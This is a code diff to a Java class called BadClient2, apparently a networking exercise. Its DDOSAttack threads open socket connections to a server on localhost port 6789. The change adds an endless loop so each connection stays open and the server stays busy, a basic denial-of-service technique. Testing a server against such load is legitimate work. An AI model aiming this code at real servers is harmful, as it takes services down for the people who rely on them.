@@ -15,7 +15,6 @@ public class BadClient2{
             DDOSAttack attack= new DDOSAttack ("localhost",6789);
             // This thread will handle the client separately
             new Thread(attack).start();
-
         }
     }
     // DDOS class
@@ -35,6 +34,8 @@ public class BadClient2{
                 try {
                     // create client socket and connect to server; this initiates TCP cnx between client and server
                     Socket clientSocket = new Socket(host, port);
+                    // Don't close the connection to keep the server busy
+                    while (true);
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
